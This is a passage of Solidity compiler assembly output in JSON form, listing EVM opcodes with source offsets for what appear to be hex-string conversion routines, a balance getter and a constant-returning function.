											"begin": 5175,
											"end": 5327,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5230,
											"end": 5232,
											"name": "PUSH",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 5224,
											"end": 5232,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5224,
											"end": 5232,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "102"
										},
										{
											"begin": 5224,
											"end": 5232,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5224,
											"end": 5232,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5224,
											"end": 5232,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 5224,
											"end": 5232,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5224,
											"end": 5232,
											"name": "tag",
											"source": 0,
											"value": "102"
										},
										{
											"begin": 5224,
											"end": 5232,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5224,
											"end": 5232,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5224,
											"end": 5232,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5175,
											"end": 5327,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "103"
										},
										{
											"begin": 5175,
											"end": 5327,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5175,
											"end": 5327,
											"name": "tag",
											"source": 0,
											"value": "101"
										},
										{
											"begin": 5175,
											"end": 5327,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5265,
											"end": 5267,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 5259,
											"end": 5261,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5259,
											"end": 5267,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5259,
											"end": 5267,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5259,
											"end": 5267,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 5259,
											"end": 5267,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5258,
											"end": 5282,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5258,
											"end": 5282,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5258,
											"end": 5282,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "104"
										},
										{
											"begin": 5258,
											"end": 5282,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5258,
											"end": 5282,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5279,
											"end": 5281,
											"name": "PUSH",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 5273,
											"end": 5275,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5273,
											"end": 5281,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5273,
											"end": 5281,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5273,
											"end": 5281,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5273,
											"end": 5281,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5258,
											"end": 5282,
											"name": "tag",
											"source": 0,
											"value": "104"
										},
										{
											"begin": 5258,
											"end": 5282,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5254,
											"end": 5327,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5254,
											"end": 5327,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "105"
										},
										{
											"begin": 5254,
											"end": 5327,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5309,
											"end": 5311,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 5303,
											"end": 5311,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5303,
											"end": 5311,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "106"
										},
										{
											"begin": 5303,
											"end": 5311,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5303,
											"end": 5311,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5303,
											"end": 5311,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 5303,
											"end": 5311,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5303,
											"end": 5311,
											"name": "tag",
											"source": 0,
											"value": "106"
										},
										{
											"begin": 5303,
											"end": 5311,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5303,
											"end": 5311,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5303,
											"end": 5311,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5254,
											"end": 5327,
											"name": "tag",
											"source": 0,
											"value": "105"
										},
										{
											"begin": 5254,
											"end": 5327,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5175,
											"end": 5327,
											"name": "tag",
											"source": 0,
											"value": "103"
										},
										{
											"begin": 5175,
											"end": 5327,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5095,
											"end": 5327,
											"name": "tag",
											"source": 0,
											"value": "99"
										},
										{
											"begin": 5095,
											"end": 5327,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5361,
											"end": 5363,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5356,
											"end": 5358,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 5351,
											"end": 5353,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 5351,
											"end": 5358,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "107"
										},
										{
											"begin": 5351,
											"end": 5358,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5351,
											"end": 5358,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5351,
											"end": 5358,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "76"
										},
										{
											"begin": 5351,
											"end": 5358,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5351,
											"end": 5358,
											"name": "tag",
											"source": 0,
											"value": "107"
										},
										{
											"begin": 5351,
											"end": 5358,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5351,
											"end": 5363,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "108"
										},
										{
											"begin": 5351,
											"end": 5363,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5351,
											"end": 5363,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5351,
											"end": 5363,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "109"
										},
										{
											"begin": 5351,
											"end": 5363,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5351,
											"end": 5363,
											"name": "tag",
											"source": 0,
											"value": "108"
										},
										{
											"begin": 5351,
											"end": 5363,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5341,
											"end": 5364,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 5341,
											"end": 5364,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "110"
										},
										{
											"begin": 5341,
											"end": 5364,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5341,
											"end": 5364,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5341,
											"end": 5364,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "109"
										},
										{
											"begin": 5341,
											"end": 5364,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5341,
											"end": 5364,
											"name": "tag",
											"source": 0,
											"value": "110"
										},
										{
											"begin": 5341,
											"end": 5364,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5341,
											"end": 5364,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 5341,
											"end": 5364,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4716,
											"end": 4717,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 4711,
											"end": 4717,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4711,
											"end": 4717,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "111"
										},
										{
											"begin": 4711,
											"end": 4717,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4711,
											"end": 4717,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4711,
											"end": 4717,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 4711,
											"end": 4717,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4711,
											"end": 4717,
											"name": "tag",
											"source": 0,
											"value": "111"
										},
										{
											"begin": 4711,
											"end": 4717,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4711,
											"end": 4717,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4711,
											"end": 4717,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "72"
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "tag",
											"source": 0,
											"value": "73"
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4678,
											"end": 5376,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5401,
											"end": 5406,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5386,
											"end": 5407,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 5386,
											"end": 5407,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5386,
											"end": 5407,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5386,
											"end": 5407,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5386,
											"end": 5407,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5386,
											"end": 5407,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4475,
											"end": 5415,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4475,
											"end": 5415,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4475,
											"end": 5415,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4475,
											"end": 5415,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10229,
											"end": 10366,
											"name": "tag",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 10229,
											"end": 10366,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10275,
											"end": 10279,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10337,
											"end": 10358,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 10330,
											"end": 10358,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10330,
											"end": 10358,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10229,
											"end": 10366,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10229,
											"end": 10366,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 4211,
											"end": 4300,
											"name": "tag",
											"source": 0,
											"value": "47"
										},
										{
											"begin": 4211,
											"end": 4300,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4262,
											"end": 4266,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 4286,
											"end": 4292,
											"name": "PUSH",
											"source": 0,
											"value": "4CC53"
										},
										{
											"begin": 4279,
											"end": 4292,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4279,
											"end": 4292,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4211,
											"end": 4300,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4211,
											"end": 4300,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5636,
											"end": 6650,
											"name": "tag",
											"source": 0,
											"value": "48"
										},
										{
											"begin": 5636,
											"end": 6650,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5689,
											"end": 5702,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 5715,
											"end": 5725,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 5740,
											"end": 5746,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5749,
											"end": 5750,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 5740,
											"end": 5750,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5740,
											"end": 5750,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5762,
											"end": 5834,
											"name": "tag",
											"source": 0,
											"value": "115"
										},
										{
											"begin": 5762,
											"end": 5834,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5774,
											"end": 5775,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 5769,
											"end": 5770,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5769,
											"end": 5775,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 5762,
											"end": 5834,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "116"
										},
										{
											"begin": 5762,
											"end": 5834,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "117"
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "118"
										},
										{
											"begin": 5792,
											"end": 5799,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "tag",
											"source": 0,
											"value": "117"
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5792,
											"end": 5799,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5819,
											"end": 5821,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 5814,
											"end": 5821,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5814,
											"end": 5821,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "119"
										},
										{
											"begin": 5814,
											"end": 5821,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5814,
											"end": 5821,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5814,
											"end": 5821,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "120"
										},
										{
											"begin": 5814,
											"end": 5821,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5814,
											"end": 5821,
											"name": "tag",
											"source": 0,
											"value": "119"
										},
										{
											"begin": 5814,
											"end": 5821,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5814,
											"end": 5821,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5814,
											"end": 5821,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5762,
											"end": 5834,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "115"
										},
										{
											"begin": 5762,
											"end": 5834,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5762,
											"end": 5834,
											"name": "tag",
											"source": 0,
											"value": "116"
										},
										{
											"begin": 5762,
											"end": 5834,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5844,
											"end": 5860,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 5873,
											"end": 5878,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "121"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "123"
										},
										{
											"begin": 5863,
											"end": 5879,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "tag",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "tag",
											"source": 0,
											"value": "121"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "124"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "CALLDATACOPY",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "tag",
											"source": 0,
											"value": "124"
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5863,
											"end": 5879,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5844,
											"end": 5879,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5844,
											"end": 5879,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5895,
											"end": 5901,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "tag",
											"source": 0,
											"value": "125"
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5907,
											"end": 5912,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 5905,
											"end": 5906,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5905,
											"end": 5912,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "126"
										},
										{
											"begin": 5890,
											"end": 6034,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5942,
											"end": 5944,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 5938,
											"end": 5939,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 5938,
											"end": 5944,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "128"
										},
										{
											"begin": 5938,
											"end": 5944,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5938,
											"end": 5944,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5938,
											"end": 5944,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "129"
										},
										{
											"begin": 5938,
											"end": 5944,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5938,
											"end": 5944,
											"name": "tag",
											"source": 0,
											"value": "128"
										},
										{
											"begin": 5938,
											"end": 5944,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5934,
											"end": 5944,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 5934,
											"end": 5944,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5980,
											"end": 6000,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "130"
										},
										{
											"begin": 5997,
											"end": 5998,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 5980,
											"end": 5990,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "131"
										},
										{
											"begin": 5980,
											"end": 6000,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5980,
											"end": 6000,
											"name": "tag",
											"source": 0,
											"value": "130"
										},
										{
											"begin": 5980,
											"end": 6000,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5962,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 5975,
											"end": 5976,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 5971,
											"end": 5972,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 5963,
											"end": 5968,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 5963,
											"end": 5972,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "132"
										},
										{
											"begin": 5963,
											"end": 5972,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5963,
											"end": 5972,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5963,
											"end": 5972,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "133"
										},
										{
											"begin": 5963,
											"end": 5972,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5963,
											"end": 5972,
											"name": "tag",
											"source": 0,
											"value": "132"
										},
										{
											"begin": 5963,
											"end": 5972,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5963,
											"end": 5976,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "134"
										},
										{
											"begin": 5963,
											"end": 5976,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5963,
											"end": 5976,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5963,
											"end": 5976,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "133"
										},
										{
											"begin": 5963,
											"end": 5976,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5963,
											"end": 5976,
											"name": "tag",
											"source": 0,
											"value": "134"
										},
										{
											"begin": 5963,
											"end": 5976,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "135"
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "136"
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 5959,
											"end": 5977,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "tag",
											"source": 0,
											"value": "136"
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "tag",
											"source": 0,
											"value": "135"
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 5977,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "BYTE",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "MSTORE8",
											"source": 0
										},
										{
											"begin": 5959,
											"end": 6000,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 6020,
											"end": 6022,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 6015,
											"end": 6022,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 6015,
											"end": 6022,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "137"
										},
										{
											"begin": 6015,
											"end": 6022,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 6015,
											"end": 6022,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 6015,
											"end": 6022,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "120"
										},
										{
											"begin": 6015,
											"end": 6022,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 6015,
											"end": 6022,
											"name": "tag",
											"source": 0,
											"value": "137"
										},
										{
											"begin": 6015,
											"end": 6022,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 6015,
											"end": 6022,
											"name": "SWAP6",
											"source": 0
										},
										{
											"begin": 6015,
											"end": 6022,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5914,
											"end": 5917,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5914,
											"end": 5917,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "138"
										},
										{
											"begin": 5914,
											"end": 5917,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5914,
											"end": 5917,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "118"
										},
										{
											"begin": 5914,
											"end": 5917,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
